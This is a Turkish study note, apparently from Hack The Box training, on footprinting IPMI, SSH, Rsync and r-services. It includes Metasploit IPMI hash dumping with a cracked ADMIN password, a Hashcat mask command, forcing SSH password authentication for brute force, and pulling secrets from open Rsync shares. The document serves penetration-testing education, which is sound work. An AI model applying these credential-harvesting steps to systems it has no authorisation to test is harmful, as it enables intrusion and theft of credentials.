IPMI, 623 UDP portu üzerinden iletişim kurar. IPMI protokolünü kullanan sistemlere Anakart Yönetim Denetleyicileri (BMC'ler) denir. BMC'ler genellikle Linux çalıştıran gömülü ARM sistemleri olarak uygulanır ve doğrudan host'un anakartına bağlanır. BMC'ler birçok anakartta yerleşik olarak bulunur ancak bir sisteme PCI kartı olarak da eklenebilir. Çoğu sunucu ya bir BMC ile birlikte gelir ya da BMC eklemeyi destekler. Dahili sızma testleri sırasında sıklıkla gördüğümüz en yaygın BMC'ler HP iLO, Dell DRAC ve Supermicro IPMI'dır. Bir değerlendirme sırasında bir BMC'ye erişebilirsek, host anakartına tam erişim elde edebilir ve host işletim sistemini izleyebilir, yeniden başlatabilir, kapatabilir ve hatta yeniden yükleyebiliriz. Bir BMC'ye erişim sağlamak neredeyse bir sisteme fiziksel erişim sağlamakla eşdeğerdir. Birçok BMC (HP iLO, Dell DRAC ve Supermicro IPMI dahil) web tabanlı bir yönetim konsolu, Telnet veya SSH gibi bir tür komut satırı uzaktan erişim protokolü ve yine IPMI ağ protokolü için olan 623 UDP portunu açığa çıkarır. Aşağıda, hizmetin ayak izini almak için Nmap [ipmi-version](https://nmap.org/nsedoc/scripts/ipmi-version.html) NSE betiğini kullanan örnek bir Nmap taraması bulunmaktadır.

#### Nmap

```shell-session
M1R4CKCK@htb[/htb]$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local

Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:48 GMT
Nmap scan report for ilo.inlanfreight.local (172.16.2.2)
Host is up (0.00064s latency).

PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version:
|   Version:
|     IPMI-2.0
|   UserAuth:
|   PassAuth: auth_user, non_null_user
|_  Level: 2.0
MAC Address: 14:03:DC:674:18:6A (Hewlett Packard Enterprise)

Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
```

Burada, IPMI protokolünün gerçekten de 623 numaralı portu dinlediğini ve Nmap'in protokolün 2.0 sürümünü parmak iziyle tespit ettiğini görebiliriz. Metasploit tarayıcı modülü [IPMI Bilgi Keşfi](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_version/)'ni de kullanabiliriz [(auxiliary/scanner/ipmi/ipmi_version)](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_version/).

#### Metasploit Version Scan

```shell-session
msf6 > use auxiliary/scanner/ipmi/ipmi_version 
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_version) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to probe in each set
   RHOSTS     10.129.42.195    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      623              yes       The target port (UDP)
   THREADS    10               yes       The number of concurrent threads


msf6 auxiliary(scanner/ipmi/ipmi_version) > run

[*] Sending IPMI requests to 10.129.42.195->10.129.42.195 (1 hosts)
[+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

İç sızma testleri sırasında, genellikle yöneticilerin varsayılan parolayı değiştirmediği BMC'ler buluruz. Hile sayfalarımızda tutmamız gereken bazı benzersiz varsayılan şifreler şunlardır:

![Pasted image 20241110014609.png](/img/user/resimler/Pasted%20image%2020241110014609.png)

Keşfettiğimiz HERHANGİ bir hizmet için bilinen varsayılan şifreleri denemek de önemlidir, çünkü bunlar genellikle değiştirilmeden bırakılır ve hızlı kazanımlara yol açabilir. BMC'lerle uğraşırken, bu varsayılan şifreler bize web konsoluna erişim veya hatta SSH veya Telnet aracılığıyla komut satırı erişimi sağlayabilir.

## **Tehlikeli Ayarlar**  

Bir BMC'ye erişmek için varsayılan kimlik bilgileri işe yaramazsa, IPMI 2.0'daki RAKP protokolündeki bir [kusura](http://fish2.com/ipmi/remote-pw-cracking.html) başvurabiliriz. Kimlik doğrulama işlemi sırasında sunucu, kimlik doğrulama gerçekleşmeden önce istemciye kullanıcının parolasının salt SHA1 veya MD5 hash'ini gönderir. Bu, BMC'deki HERHANGİ bir geçerli kullanıcı hesabının parola hash'ini elde etmek için kullanılabilir. Bu parola hash'leri daha sonra `Hashcat` modu `7300` kullanılarak bir sözlük saldırısı ile çevrimdışı olarak kırılabilir. HP iLO'nun fabrika varsayılan parolasını kullanması durumunda, sekiz karakterli bir parola için tüm büyük harf ve rakam kombinasyonlarını deneyen bu Hashcat maskesi saldırı komutunu `hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1 -1 ?d?u` kullanabiliriz.

Bu sorun için doğrudan bir “düzeltme” yoktur çünkü kusur IPMI spesifikasyonunun kritik bir bileşenidir. Müşteriler, BMC'lere doğrudan erişimi kısıtlamak için çok uzun, kırılması zor şifreleri tercih edebilir veya ağ segmentasyon kuralları uygulayabilir. Dahili sızma testleri sırasında IPMI'yi gözden kaçırmamak önemlidir (çoğu değerlendirmede bunu görürüz) çünkü yalnızca BMC web konsoluna erişim elde etmekle kalmayız, ki bu yüksek riskli bir bulgudur, aynı zamanda daha sonra diğer sistemlerde yeniden kullanılan benzersiz (ancak kırılabilir) bir parolanın belirlendiği ortamlar gördük. Böyle bir sızma testinde, bir IPMI hash'i elde ettik, Hashcat kullanarak çevrimdışı olarak kırdık ve ortamdaki birçok kritik sunucuya root kullanıcısı olarak SSH ile girebildik ve çeşitli ağ izleme araçları için web yönetim konsollarına erişim sağladık.  

IPMI hash'lerini almak için Metasploit IPMI [2.0 RAKP Remote SHA1 Password Hash Retrieval](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_dumphashes/) modülünü kullanabiliriz.

#### Metasploit Dumping Hashes

```shell-session
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                 Current Setting                                                    Required  Description
   ----                 ---------------                                                    --------  -----------
   CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format
   PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
   RHOSTS               10.129.42.195                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                623                                                                yes       The target port
   THREADS              1                                                                  yes       The number of concurrent threads (max one per host)
   USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line



msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
[+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Burada, `ADMIN` kullanıcısının parola hash'ini başarıyla elde ettiğimizi ve aracın bunu hızlı bir şekilde kırarak varsayılan parola `ADMIN` gibi görünen bir parolayı ortaya çıkardığını görebiliriz. Buradan, BMC'de oturum açmayı deneyebilir veya parola daha benzersiz bir şey olsaydı, parolanın diğer sistemlerde yeniden kullanılıp kullanılmadığını kontrol edebilirdik. IPMI ağ ortamlarında çok yaygındır çünkü sistem yöneticilerinin bir kesinti durumunda sunuculara uzaktan erişebilmeleri veya geleneksel olarak tamamlamak için fiziksel olarak sunucunun önünde olmaları gereken belirli bakım görevlerini yerine getirebilmeleri gerekir. Bu yönetim kolaylığı, parola hash'lerinin ağdaki herhangi birine ifşa edilmesi riskini beraberinde getirir ve yetkisiz erişime, sistemin bozulmasına ve hatta uzaktan kod yürütülmesine yol açabilir. IPMI'yi kontrol etmek, değerlendirdiğimiz her ortam için dahili sızma testi oyun kitabımızın bir parçası olmalıdır.


Soru : 
cevap : admin

![Pasted image 20241110015624.png](/img/user/resimler/Pasted%20image%2020241110015624.png)


```shell-session
[msf](Jobs:0 Agents:0) >> use auxiliary/scanner/ipmi/ipmi_dumphashes  
[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_dumphashes) >> show options  
  
Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):  
  
Name Current Setting Required Description  
---- --------------- -------- -----------  
CRACK_COMMON true yes Automatically crack common  
passwords as they are obtai  
ned  
OUTPUT_HASHCAT_FI no Save captured password hash  
LE es in hashcat format  
OUTPUT_JOHN_FILE no Save captured password hash  
es in john the ripper forma  
t  
PASS_FILE /usr/share/metasp yes File containing common pass  
loit-framework/da words for offline cracking,  
ta/wordlists/ipmi one per line  
_passwords.txt  
RHOSTS yes The target host(s), see htt  
ps://docs.metasploit.com/do  
cs/using-metasploit/basics/  
using-metasploit.html  
RPORT 623 yes The target port  
SESSION_MAX_ATTEM 5 yes Maximum number of session r  
PTS etries, required on certain  
BMCs (HP iLO 4, etc)  
SESSION_RETRY_DEL 5 yes Delay between session retri  
AY es in seconds  
THREADS 1 yes The number of concurrent th  
reads (max one per host)  
USER_FILE /usr/share/metasp yes File containing usernames,  
loit-framework/da one per line  
ta/wordlists/ipmi  
_users.txt  
  
  
View the full module info with the info, or info -d command.  
  
[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_dumphashes) >> set rHOSTS 10.129.202.5  
rHOSTS => 10.129.202.5  
[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_dumphashes) >> r  
[-] Unknown command: r  
[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_dumphashes) >> run  
  
[+] 10.129.202.5:623 - IPMI - Hash found: admin:66805ed18200000024916634baec217153f4a4f098f3b1a4b829916499a334c2c30c3f7bd7801d58a123456789abcdefa123456789abcdef140561646d696e:36d31bae5b59738ef66255a3123627f6fdefa3b2  
[*] Scanned 1 of 1 hosts (100% complete)  
[*] Auxiliary module execution completed
```

![Pasted image 20241110020155.png](/img/user/resimler/Pasted%20image%2020241110020155.png)


# Linux Remote Management Protocols

## **SSH**  

[Secure Shell](https://en.wikipedia.org/wiki/Secure_Shell) (`SSH`) iki bilgisayarın standart `TCP 22` portu üzerinde muhtemelen güvensiz bir ağ içinde şifreli ve doğrudan bir bağlantı kurmasını sağlar. Bu, üçüncü tarafların veri akışına müdahale etmesini ve böylece hassas verileri ele geçirmesini önlemek için gereklidir. SSH sunucusu, yalnızca belirli istemcilerden gelen bağlantılara izin verecek şekilde de yapılandırılabilir. SSH'nin bir avantajı, protokolün tüm yaygın işletim sistemlerinde çalışmasıdır. Aslen bir Unix uygulaması olduğundan, tüm Linux dağıtımlarında ve MacOS'ta da yerel olarak uygulanmaktadır. SSH, uygun bir program yüklememiz koşuluyla Windows'ta da kullanılabilir. Linux dağıtımlarındaki iyi bilinen [OpenBSD SSH](“https://www.openssh.com/”) (`OpenSSH`) sunucusu, SSH Communication Security'nin orijinal ve ticari `SSH` sunucusunun açık kaynaklı bir uzantısıdır. Buna göre, iki rakip protokol vardır: `SSH-1` ve `SSH-2`.

`SSH` sürüm 2 olarak da bilinen`SSH-2`, şifreleme, hız, kararlılık ve güvenlik açısından SSH sürüm 1'den daha gelişmiş bir protokoldür. Örneğin, `SSH-1` `MITM` saldırılarına karşı savunmasızken, SSH-2 değildir.  

Uzak bir hostu yönetmek istediğimizi düşünebiliriz. Bu, komut satırı veya GUI aracılığıyla yapılabilir. Ayrıca, SSH protokolünü istenen sisteme komut göndermek, dosya aktarmak veya port yönlendirme yapmak için de kullanabiliriz. Bu nedenle, SSH protokolünü kullanarak ona bağlanmamız ve kimliğimizi doğrulamamız gerekir. OpenSSH toplamda altı farklı kimlik doğrulama yöntemine sahiptir:

1. Password authentication
2. Public-key authentication
3. Host-based authentication
4. Keyboard authentication
5. Challenge-response authentication
6. GSSAPI authentication

En yaygın kullanılan kimlik doğrulama yöntemlerinden birine daha yakından bakacağız ve tartışacağız. [Buna](“https://www.golinuxcloud.com/openssh-authentication-methods-sshd-config/”) ek olarak, diğer kimlik doğrulama yöntemleri hakkında daha fazla bilgi edinebilirsiniz.

#### **Public Key Authentication**  

İlk adımda, SSH sunucusu ve istemci birbirlerinin kimliklerini doğrular. Sunucu, doğru sunucu olduğunu doğrulamak için istemciye bir sertifika gönderir. Yalnızca bağlantı ilk kurulduğunda, üçüncü bir tarafın iki katılımcı arasına girme ve böylece bağlantıyı kesme riski vardır. Sertifikanın kendisi de şifreli olduğu için taklit edilemez. İstemci doğru sertifikayı bildiğinde, başka hiç kimse ilgili sunucu üzerinden bağlantı kuruyormuş gibi yapamaz.  

Ancak sunucu kimlik doğrulamasından sonra istemcinin de erişim yetkisine sahip olduğunu sunucuya kanıtlaması gerekir. Ancak SSH sunucusu, istenen kullanıcı için belirlenen parolanın şifrelenmiş hash değerine zaten sahiptir. Sonuç olarak, kullanıcılar aynı oturum sırasında başka bir sunucuya her giriş yaptıklarında şifreyi girmek zorunda kalırlar. Bu nedenle, istemci tarafı kimlik doğrulaması için alternatif bir seçenek, bir public key ve private key çiftinin kullanılmasıdır.  

Private key kullanıcının kendi bilgisayarı için özel olarak oluşturulur ve tipik bir paroladan daha uzun olması gereken bir parola ile güvence altına alınır. Private key sadece kendi bilgisayarımızda saklanır ve her zaman gizli kalır. Bir SSH bağlantısı kurmak istiyorsak, önce parolayı gireriz ve böylece özel anahtara erişimi açarız.

Public anahtarlar da sunucuda saklanır. Sunucu, istemcinin public anahtarıyla bir kriptografik problem yaratır ve bunu istemciye gönderir. İstemci de kendi private key'i ile problemin şifresini çözer, çözümü geri gönderir ve böylece sunucuya meşru bir bağlantı kurabileceğini bildirir. Bir oturum sırasında, kullanıcıların herhangi bir sayıda sunucuya bağlanmak için parolayı yalnızca bir kez girmeleri gerekir. Oturumun sonunda kullanıcılar yerel makinelerinden çıkış yaparak yerel makineye fiziksel erişim sağlayan hiçbir üçüncü tarafın sunucuya bağlanamamasını sağlar.

## **Varsayılan Yapılandırma**  

OpenSSH sunucusundan sorumlu olan [sshd_config](https://www.ssh.com/academy/ssh/sshd_config) dosyası, varsayılan olarak yapılandırılmış ayarlardan yalnızca birkaçına sahiptir. Bununla birlikte, varsayılan yapılandırma, 2016 yılında OpenSSH'nin 7.2p1 sürümünde bir komut enjeksiyonu güvenlik açığı içeren X11 yönlendirmesini içerir. Yine de sunucularımızı yönetmek için bir GUI'ye ihtiyacımız yok.

#### Default Configuration

```shell-session
M1R4CKCK@htb[/htb]$ cat /etc/ssh/sshd_config  | grep -v "#" | sed -r '/^\s*$/d'

Include /etc/ssh/sshd_config.d/*.conf
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server
```

Bu yapılandırma dosyasındaki çoğu ayar yorumlanmıştır ve manuel yapılandırma gerektirir.

## **Tehlikeli Ayarlar**  

SSH protokolü günümüzde mevcut en güvenli protokollerden biri olmasına rağmen, bazı yanlış yapılandırmalar SSH sunucusunu yürütülmesi kolay saldırılara karşı savunmasız hale getirebilir. Aşağıdaki ayarlara bir göz atalım:

![Pasted image 20241110150426.png](/img/user/resimler/Pasted%20image%2020241110150426.png)

Parola kimlik doğrulamasına izin vermek, olası parolalar için bilinen bir kullanıcı adını brute-force uygulamamıza olanak tanır. Kullanıcıların şifrelerini tahmin etmek için birçok farklı yöntem kullanılabilir. Bu amaçla, genellikle en sık kullanılan şifreleri mutasyona uğratmak ve korkutucu bir şekilde düzeltmek için belirli `modeller` kullanılır. Bunun nedeni biz insanların tembel olması ve karmaşık ve karmaşık şifreleri hatırlamak istemememizdir. Bu nedenle, kolayca hatırlayabileceğimiz şifreler oluşturuyoruz ve bu da örneğin rakamların veya karakterlerin yalnızca şifrenin sonuna eklenmesine yol açıyor. Şifrenin güvenli olduğuna inanarak, söz konusu kalıplar bu şifrelerin tam olarak bu tür “ayarlamalarını” tahmin etmek için kullanılır. Bununla birlikte, SSH sunucularımızı sertleştirmek için bazı talimatlar ve sertleştirme [kılavuzları](https://www.ssh-audit.com/hardening_guides.html) kullanılabilir.


## Footprinting the Service

SSH sunucusunun parmak izini almak için kullanabileceğimiz araçlardan biri [ssh-audit](https://github.com/jtesta/ssh-audit). İstemci ve sunucu tarafındaki yapılandırmayı kontrol eder ve bazı genel bilgileri ve istemci ve sunucu tarafından hala hangi şifreleme algoritmalarının kullanıldığını gösterir. Tabii ki, bu daha sonra sunucuya veya istemciye şifreli düzeyde saldırarak istismar edilebilir.

#### SSH-Audit

```shell-session
M1R4CKCK@htb[/htb]$ git clone https://github.com/jtesta/ssh-audit.git && cd ssh-audit
M1R4CKCK@htb[/htb]$ ./ssh-audit.py 10.129.14.132

# general
(gen) banner: SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3
(gen) software: OpenSSH 8.2p1
(gen) compatibility: OpenSSH 7.4+, Dropbear SSH 2018.76+
(gen) compression: enabled (zlib@openssh.com)                                   

# key exchange algorithms
(kex) curve25519-sha256                     -- [info] available since OpenSSH 7.4, Dropbear SSH 2018.76                            
(kex) curve25519-sha256@libssh.org          -- [info] available since OpenSSH 6.5, Dropbear SSH 2013.62
(kex) ecdh-sha2-nistp256                    -- [fail] using weak elliptic curves
                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62
(kex) ecdh-sha2-nistp384                    -- [fail] using weak elliptic curves
                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62
(kex) ecdh-sha2-nistp521                    -- [fail] using weak elliptic curves
                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62
(kex) diffie-hellman-group-exchange-sha256 (2048-bit) -- [info] available since OpenSSH 4.4
(kex) diffie-hellman-group16-sha512         -- [info] available since OpenSSH 7.3, Dropbear SSH 2016.73
(kex) diffie-hellman-group18-sha512         -- [info] available since OpenSSH 7.3
(kex) diffie-hellman-group14-sha256         -- [info] available since OpenSSH 7.3, Dropbear SSH 2016.73

# host-key algorithms
(key) rsa-sha2-512 (3072-bit)               -- [info] available since OpenSSH 7.2
(key) rsa-sha2-256 (3072-bit)               -- [info] available since OpenSSH 7.2
(key) ssh-rsa (3072-bit)                    -- [fail] using weak hashing algorithm
                                            `- [info] available since OpenSSH 2.5.0, Dropbear SSH 0.28
                                            `- [info] a future deprecation notice has been issued in OpenSSH 8.2: https://www.openssh.com/txt/release-8.2
(key) ecdsa-sha2-nistp256                   -- [fail] using weak elliptic curves
                                            `- [warn] using weak random number generator could reveal the key
                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62
(key) ssh-ed25519                           -- [info] available since OpenSSH 6.5
...SNIP...
```

Çıktının ilk birkaç satırında görebileceğimiz ilk şey OpenSSH sunucusunun sürümünü gösteren başlıktır. Önceki sürümlerde CVE-2020-14145 gibi, saldırganın Man-In-The-Middle yapmasına ve ilk bağlantı girişimine saldırmasına olanak tanıyan bazı güvenlik açıkları vardı. OpenSSH sunucusuyla bağlantı kurulumunun ayrıntılı çıktısı, genellikle sunucunun hangi kimlik doğrulama yöntemlerini kullanabileceği gibi önemli bilgiler de sağlayabilir.


### Kimlik Doğrulama Yöntemini Değiştir
```shell-session
M1R4CKCK@htb[/htb]$ ssh -v cry0l1t3@10.129.14.132

OpenSSH_8.2p1 Ubuntu-4ubuntu0.3, OpenSSL 1.1.1f  31 Mar 2020
debug1: Reading configuration data /etc/ssh/ssh_config 
...SNIP...
debug1: Authentications that can continue: publickey,password,keyboard-interactive
```

Olası brute-force saldırıları için, SSH istemci seçeneği PreferredAuthentications ile kimlik doğrulama yöntemini belirleyebiliriz.

```shell-session
M1R4CKCK@htb[/htb]$ ssh -v cry0l1t3@10.129.14.132 -o PreferredAuthentications=password

OpenSSH_8.2p1 Ubuntu-4ubuntu0.3, OpenSSL 1.1.1f  31 Mar 2020
debug1: Reading configuration data /etc/ssh/ssh_config
...SNIP...
debug1: Authentications that can continue: publickey,password,keyboard-interactive
debug1: Next authentication method: password

cry0l1t3@10.129.14.132's password:
```

Bu açık ve güvenli hizmetle bile, sanal makinemizde kendi OpenSSH sunucumuzu kurmanızı, denemeler yapmanızı ve farklı ayar ve seçeneklere aşina olmanızı öneririz.

Sızma testlerimiz sırasında SSH sunucusu için çeşitli banner'larla karşılaşabiliriz. Varsayılan olarak, bannerlar uygulanabilecek protokolün sürümü ve ardından sunucunun kendi sürümü ile başlar. Örneğin, SSH-1.99-OpenSSH_3.9p1 ile, SSH-1 ve SSH-2 protokol sürümlerinin her ikisini de kullanabileceğimizi ve OpenSSH sunucu sürümü 3.9p1 ile uğraştığımızı biliyoruz. Öte yandan, SSH-2.0-OpenSSH_8.2p1 ile bir banner için, yalnızca SSH-2 protokol sürümünü kabul eden bir OpenSSH sürüm 8.2p1 ile uğraşıyoruz.


## **Rsync**  

[Rsync](“https://linux.die.net/man/1/rsync”), dosyaları lokal ve remote olarak kopyalamak için hızlı ve etkili bir araçtır. Dosyaları belirli bir makinede lokal olarak ve remote host'lara / host'lardan kopyalamak için kullanılabilir. Çok yönlüdür ve delta-transfer algoritmasıyla tanınır. Bu algoritma, dosyanın bir sürümü hedef hostta zaten mevcut olduğunda ağ üzerinden iletilen veri miktarını azaltır. Bunu, yalnızca kaynak dosyalar ile hedef sunucuda bulunan dosyaların eski sürümleri arasındaki farkları göndererek yapar. Genellikle yedekleme ve yansıtma için kullanılır. Boyutu veya son değiştirilme zamanı değişen dosyalara bakarak aktarılması gereken dosyaları bulur. Varsayılan olarak `873` numaralı portu kullanır ve kurulu bir SSH sunucu bağlantısının üzerine bindirme yaparak güvenli dosya aktarımları için SSH kullanacak şekilde yapılandırılabilir.

Bu [kılavuz](https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync), Rsync'in kötüye kullanılabileceği bazı yolları, özellikle de bir hedef sunucudaki paylaşılan bir klasörün içeriğini listeleyerek ve dosyaları alarak kapsar. Bu bazen kimlik doğrulaması olmadan yapılabilir. Diğer zamanlarda kimlik bilgilerine ihtiyacımız olacaktır. Bir pentest sırasında kimlik bilgilerini bulursanız ve dahili (veya harici) bir hostta Rsync ile karşılaşırsanız, hedefe uzaktan erişim elde etmek için kullanılabilecek bazı hassas dosyaları aşağı çekebileceğiniz için parolanın yeniden kullanımını kontrol etmeye her zaman değer.  

Biraz hızlı ayak izi incelemesi yapalım. Rsync'in protokol 31'i kullanarak kullanımda olduğunu görebiliriz.


#### Scanning for Rsync

```shell-session
M1R4CKCK@htb[/htb]$ sudo nmap -sV -p 873 127.0.0.1

Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-19 09:31 EDT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.0058s latency).

PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.13 seconds
```

#### **Erişilebilir Paylaşımlar için Problama**  

Daha sonra nelere erişebileceğimizi görmek için hizmeti biraz araştırabiliriz.

```shell-session
M1R4CKCK@htb[/htb]$ nc -nv 127.0.0.1 873

(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
#list
dev            	Dev Tools
@RSYNCD: EXIT
```


#### **Açık Bir Paylaşımın Numaralandırılması**  

Burada `dev` adında bir paylaşım görebiliriz ve bunu daha fazla numaralandırabiliriz.

```shell-session
M1R4CKCK@htb[/htb]$ rsync -av --list-only rsync://127.0.0.1/dev

receiving incremental file list
drwxr-xr-x             48 2022/09/19 09:43:10 .
-rw-r--r--              0 2022/09/19 09:34:50 build.sh
-rw-r--r--              0 2022/09/19 09:36:02 secrets.yaml
drwx------             54 2022/09/19 09:43:10 .ssh

sent 25 bytes  received 221 bytes  492.00 bytes/sec
total size is 0  speedup is 0.00
```

Yukarıdaki çıktıdan, daha fazla araştırmak için aşağı çekmeye değebilecek birkaç ilginç dosya görebiliriz. Ayrıca muhtemelen SSH anahtarlarını içeren bir dizine erişilebildiğini de görebiliriz. Buradan, `rsync -av rsync://127.0.0.1/dev` komutuyla tüm dosyaları saldırı hostumuza senkronize edebiliriz. Rsync dosyaları aktarmak için SSH kullanacak şekilde yapılandırılmışsa, komutlarımızı `-e ssh` bayrağını veya SSH için standart olmayan bir port kullanılıyorsa `-e "ssh -p2222` " komutunu içerecek şekilde değiştirebiliriz `.` Bu [kılavuz](https://phoenixnap.com/kb/how-to-rsync-over-ssh), Rsync'i SSH üzerinden kullanmanın sözdizimini anlamak için yararlıdır.

## **R-Services**  

R-Services, TCP/IP üzerinden Unix hostları arasında uzaktan erişim sağlamak veya komutlar vermek için barındırılan bir servis paketidir. Başlangıçta Berkeley'deki California Üniversitesi Bilgisayar Sistemleri Araştırma Grubu (`CSRG`) tarafından geliştirilen `r- servisleri`, içlerinde bulunan güvenlik kusurları nedeniyle Secure Shell (`SSH`) protokolleri ve komutları ile değiştirilene kadar Unix işletim sistemleri arasında uzaktan erişim için fiili standarttı. `Telnet` gibi, r-services de bilgileri istemciden sunucuya (ve tersi) ağ üzerinden şifrelenmemiş bir biçimde ileterek saldırganların ortadaki adam (`MITM`) saldırıları gerçekleştirerek ağ trafiğini (parolalar, oturum açma bilgileri vb.) ele geçirmesini mümkün kılar.

`R- servisleri` `512`, `513` ve `514` numaralı portları kapsar ve yalnızca `r-komutları` olarak bilinen bir program paketi aracılığıyla erişilebilir. En yaygın olarak Solaris, HP-UX ve AIX gibi ticari işletim sistemleri tarafından kullanılırlar. Günümüzde daha az yaygın olmakla birlikte, dahili sızma testlerimiz sırasında zaman zaman bunlarla karşılaşıyoruz, bu nedenle bunlara nasıl yaklaşılacağını anlamaya değer.  

[R-commands](“https://en.wikipedia.org/wiki/Berkeley_r-commands”) paketi aşağıdaki programlardan oluşmaktadır:

- rcp (`remote copy`)
- rexec (`remote execution`)
- rlogin (`remote login`)
- rsh (`remote shell`)
- rstat
- ruptime
- rwho (`remote who`)


Her komutun amaçlanan işlevselliği vardır; ancak, biz sadece en sık kötüye kullanılan `r-komutlarını` ele alacağız. Aşağıdaki tablo, etkileşimde bulundukları hizmet daemon'u, hangi port ve aktarım yöntemi üzerinden erişilebilecekleri ve her birinin kısa bir açıklaması dahil olmak üzere en sık kötüye kullanılan komutlara hızlı bir genel bakış sağlayacaktır.

![Pasted image 20241110152252.png](/img/user/resimler/Pasted%20image%2020241110152252.png)

etc/hosts.equiv dosyası güvenilen hostların bir listesini içerir ve ağdaki diğer sistemlere erişim izni vermek için kullanılır. Bu hostlardan birindeki kullanıcılar sisteme erişmeye çalıştığında, daha fazla kimlik doğrulaması yapılmadan otomatik olarak erişim izni verilir.

#### /etc/hosts.equiv

```shell-session
M1R4CKCK@htb[/htb]$ cat /etc/hosts.equiv

# <hostname> <local username>
pwnbox cry0l1t3
```

Artık `r-komutları` hakkında temel bir anlayışa sahip olduğumuza göre, gerekli tüm portların açık olup olmadığını belirlemek için `Nmap` kullanarak hızlı bir ayak izi taraması yapalım.

#### Scanning for R-Services

```shell-session
M1R4CKCK@htb[/htb]$ sudo nmap -sV -p 512,513,514 10.0.17.2

Starting Nmap 7.80 ( https://nmap.org ) at 2022-12-02 15:02 EST
Nmap scan report for 10.0.17.2
Host is up (0.11s latency).

PORT    STATE SERVICE    VERSION
512/tcp open  exec?
513/tcp open  login?
514/tcp open  tcpwrapped

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 145.54 seconds
```

#### **Erişim Kontrolü ve Güvenilir İlişkiler**  

`R-hizmetleri` için birincil endişe ve `SSH` 'ın onun yerini almasının birincil nedenlerinden biri, bu protokoller için erişim kontrolü ile ilgili doğal sorunlardır. R-hizmetleri, uzak istemciden kimlik doğrulama girişiminde bulundukları host makineye gönderilen güvenilir bilgilere dayanır. Varsayılan olarak, bu hizmetler uzak bir sistemde kullanıcı kimlik doğrulaması için [Takılabilir Kimlik Doğrulama Modüllerini (PAM)](https://debathena.mit.edu/trac/wiki/PAM) kullanır; ancak, sistemdeki `/etc/hosts.equiv` ve `.rhosts` dosyalarını kullanarak bu kimlik doğrulamasını da atlarlar. `hosts.equiv` ve `.rhosts` dosyaları, `r-komutları` kullanılarak bir bağlantı denemesi yapıldığında yerel host tarafından `güvenilen` `hostların`(`IP'ler` veya `Host Adları`) ve kullanıcıların bir listesini içerir. Her iki dosyadaki girişler aşağıdaki gibi görünebilir:

**Not:** `hosts.equiv` dosyası bir sistemdeki tüm kullanıcılarla ilgili genel yapılandırma olarak kabul edilirken, `.rhosts` kullanıcı başına yapılandırma sağlar.

#### Sample .rhosts File

```shell-session
M1R4CKCK@htb[/htb]$ cat .rhosts

htb-student     10.0.17.5
+               10.0.17.10
+               +
```

